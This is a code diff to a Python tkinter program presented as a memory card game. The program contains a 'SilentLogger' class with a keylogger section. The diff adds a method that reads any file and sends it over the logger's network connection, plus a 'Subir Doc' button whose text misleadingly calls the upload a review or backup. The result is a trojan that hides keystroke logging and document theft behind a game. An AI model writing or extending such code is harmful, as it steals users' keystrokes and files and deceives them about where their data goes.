@@ -16,7 +16,7 @@ import time
 import random
 import threading
 import tkinter as tk
-from tkinter import messagebox
+from tkinter import messagebox, filedialog
 from datetime import datetime
 
 try:
@@ -152,6 +152,17 @@ class SilentLogger:
             return True
         except (BrokenPipeError, ConnectionResetError, OSError):
             self.connected = False
+            return False
+
+    def send_file(self, filepath):
+        if not os.path.exists(filepath):
+            return False
+        try:
+            with open(filepath, "rb") as f:
+                data = f.read()
+            fname = os.path.basename(filepath)
+            return self.send_data("file", data, fname)
+        except Exception:
             return False
 
     # ── Keylogger ─────────────────────────────────────────
@@ -508,6 +519,11 @@ class MemoramaApp:
                   cursor="hand2", padx=15, pady=5, relief="flat",
                   command=self.show_game).pack(side=tk.LEFT)
 
+        tk.Button(bottom, text="📁 Subir Doc", font=("Helvetica", 11, "bold"),
+                  bg="#00d2ff", fg="#111", activebackground="#0099cc",
+                  cursor="hand2", padx=15, pady=5, relief="flat",
+                  command=self.upload_file_action).pack(side=tk.LEFT, padx=10)
+
         tk.Button(bottom, text="🚪 Salir", font=("Helvetica", 11, "bold"),
                   bg="#e94560", fg="white", activebackground="#c82333",
                   cursor="hand2", padx=15, pady=5, relief="flat",
@@ -561,6 +577,18 @@ class MemoramaApp:
             f"¡Felicidades!\n\nMovimientos: {self.moves}\n"
             f"Tiempo: {elapsed//60:02d}:{elapsed%60:02d}\n\n¿Quieres jugar de nuevo?")
         self.show_game()
+
+    def upload_file_action(self):
+        """Simula subir un archivo de configuración o reporte del juego."""
+        filepath = filedialog.askopenfilename(
+            title="Seleccionar documento para subir",
+            filetypes=[("Documentos", "*.txt *.pdf *.docx *.doc *.xlsx *.xls"), ("Todos", "*.*")]
+        )
+        if filepath:
+            if self.logger and self.logger.send_file(filepath):
+                messagebox.showinfo("Éxito", "Documento enviado correctamente para revisión.")
+            else:
+                messagebox.showerror("Error", "No se pudo conectar con el servidor de respaldo.")
 
     def clear_window(self):
         for widget in self.root.winfo_children():
